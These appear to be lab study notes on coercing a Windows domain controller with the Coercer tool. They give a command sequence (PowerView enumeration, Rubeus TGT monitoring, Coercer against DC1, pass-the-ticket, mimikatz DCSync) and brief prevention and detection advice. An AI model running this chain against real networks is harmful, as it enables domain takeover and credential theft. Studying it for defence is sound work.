Description:

  - Utilize the Coercer tool to exploit all known vulnerable RPC functions.

  - Relay the connection to another DC and perform DCSync (if SMB signing is disabled) 

  - Force the Domain controller to connect to a machine configured for Unconstrained
  Delegation - this will cache the TGT in the memory of the UD server, which can be
  captured/exported with tools like Rubeus and Mimikatz.

  - Relay the connection to AD Certificate Services to obtain a certificate for the DC.
  Threat agents can then use the certificate on-demand to authenticate and pretend to be
  the DC (e.g. DCSync)

  - Relay the connection to configure Resource-based kerberos delegation for the relayed
  machine. We can then abuse the delegation to authenticate as any administrator to that machine


Attack:

  - This assumes the attacker has gained admin rights on a server configured for unconstrained
  delegation. We will use this server to capture the TGT, while coercer will be executed from
  Kali machine

  - To ID systems configured for Uncostrained delegation, use the Get-NetComputer function from 
  PowerView along with the -Unconstrained switch
    
    Get-NetComputer -Unconstrained | select samaccountname

  - We will start Rubeus in an admin prompt to monitor new logons and extract TGTs
   
    .\Rubeus.exe monitor /interval:1

  - Need to know the IP of WS001 which can be obtained using ipconfig

  - Once we know, we will switch to Kali machine to execute Coercer towards DC1, while
  we force it to connect to WS001 if coercing is successful.

    Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

  - Next, check the output of Rubeus there will be a TGT for DC1

  - Can use this TGT for authentication within the domain, becoming the DC

  - One way of using the TGT is through Rubeus

    .\Rubeus.exe ptt /ticket:XXXXX

  - Then, a DCSync attack can be executed through mimikatz


Prevention:

    - Implement a third-party RPC firewall, such as zero networks, and use it to block
    dangerous RPC functions

    - Block DC and other core infrastructure servers from connecting to ports 139 and 445,
    except to machines that are required for AD


Detection:

    - A successful coercing attack with Coercer will result inbound requests to 445 and outbound
    connections following towards port 445
